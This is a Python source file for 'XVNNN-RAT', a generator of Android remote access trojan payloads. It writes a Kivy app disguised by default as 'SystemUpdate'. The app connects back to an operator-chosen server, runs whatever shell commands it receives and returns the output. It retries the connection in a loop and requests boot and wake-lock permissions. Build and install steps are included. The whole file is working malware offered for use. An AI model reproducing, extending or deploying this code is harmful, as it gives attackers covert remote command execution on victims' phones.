"""
APK Generator for XVNNN-RAT
Author: Ali Zafar (alizafarbati@gmail.com)
"""

import os
import logging

logger = logging.getLogger(__name__)


class APKGenerator:
    """Generate Android APK payloads"""

    def __init__(self):
        self.name = "apk_generator"

    def create_main_py(self, server_ip, server_port):
        """Create main.py for Kivy app"""
        main_code = f'''import socket
import json
import subprocess
import threading
import time
import os
import sys
import shlex
from kivy.app import App
from kivy.uix.widget import Widget

def receive_json(sock, max_size=10485760):  # 10MB limit
    """Receive JSON data from socket with size limit to prevent DoS"""
    try:
        data = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(data) > max_size:
                return None
            if b'\\n' in chunk:
                break
        
        if not data:
            return None
            
        data = data.strip()
        if not data:
            return None
            
        return json.loads(data.decode('utf-8'))
    except Exception:
        return None

class XVNNNClient:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.running = True
    
    def connect(self):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((self.server_ip, self.server_port))
                
                info = {{
                    "type": "info",
                    "os": "Android",
                    "hostname": "Android Device"
                }}
                s.send(json.dumps(info).encode() + b'\\n')
                
                while self.running:
                    try:
                        msg = receive_json(s)
                        if not msg:
                            break
                        if msg.get("type") == "shell":
                            cmd = msg.get("command", "")
                            # Basic validation
                            if len(cmd) > 10000:
                                continue
                            # Safer execution using shlex (though limited on Android)
                            try:
                                args = shlex.split(cmd)
                                result = subprocess.run(args, shell=False, capture_output=True)
                                output = result.stdout.decode('utf-8', errors='replace') + result.stderr.decode('utf-8', errors='replace')
                            except:
                                # Fallback if shlex fails
                                output = "Command execution failed"
                            response = {{"type": "shell", "output": output}}
                            s.send(json.dumps(response).encode() + b'\\n')
                    except:
                        pass
                s.close()
            except:
                time.sleep(30)

class XVNNNApp(App):
    def build(self):
        client = XVNNNClient("{server_ip}", {server_port})
        thread = threading.Thread(target=client.connect, daemon=True)
        thread.start()
        return Widget()

if __name__ == '__main__':
    XVNNNApp().run()
'''
        return main_code

    def create_buildozer_spec(self, app_name="SystemUpdate"):
        """Create buildozer.spec file"""
        spec = f"""[app]

title = {app_name}
package.name = {app_name.lower()}
package.domain = com
source.dir = .
main.filename = main.py
requirements = python3,kivy
android.api = 28
android.minapi = 14
android.target_api = 28
android.permissions = INTERNET,ACCESS_NETWORK_STATE,WAKE_LOCK,RECEIVE_BOOT_COMPLETED,FOREGROUND_SERVICE
android.release_artifact = apk
android.enable_androidx = True
orientation = portrait

[buildozer]
log_level = 2
build_dir = .buildozer
dist_dir = dist
actions = clean,android,release
"""
        return spec

    def generate_apk_project(
        self, server_ip, server_port, app_name="SystemUpdate", output_dir=None
    ):
        """Generate APK project files"""
        if output_dir is None:
            output_dir = os.path.join(os.getcwd(), "apk_builds")

        os.makedirs(output_dir, exist_ok=True)
        project_dir = os.path.join(output_dir, app_name)
        os.makedirs(project_dir, exist_ok=True)

        try:
            # Create main.py
            main_py = self.create_main_py(server_ip, server_port)
            with open(os.path.join(project_dir, "main.py"), "w") as f:
                f.write(main_py)

            # Create buildozer.spec
            spec = self.create_buildozer_spec(app_name)
            with open(os.path.join(project_dir, "buildozer.spec"), "w") as f:
                f.write(spec)

            result = {
                "status": "success",
                "project_dir": project_dir,
                "files_created": [
                    "main.py",
                    "buildozer.spec",
                ],
                "next_steps": [
                    f"cd {project_dir}",
                    "buildozer android debug",
                    "Install APK from bin directory",
                ],
                "instructions": """
                To build the APK:
                1. Install buildozer: pip install buildozer
                2. Install Android SDK/NDK
                3. cd to project directory
                4. Run: buildozer android debug
                5. Install the APK from .buildozer/android/platform/build-arm64-v8a/dists
                """,
            }

            return result

        except Exception as e:
            return {"status": "error", "error": str(e)}
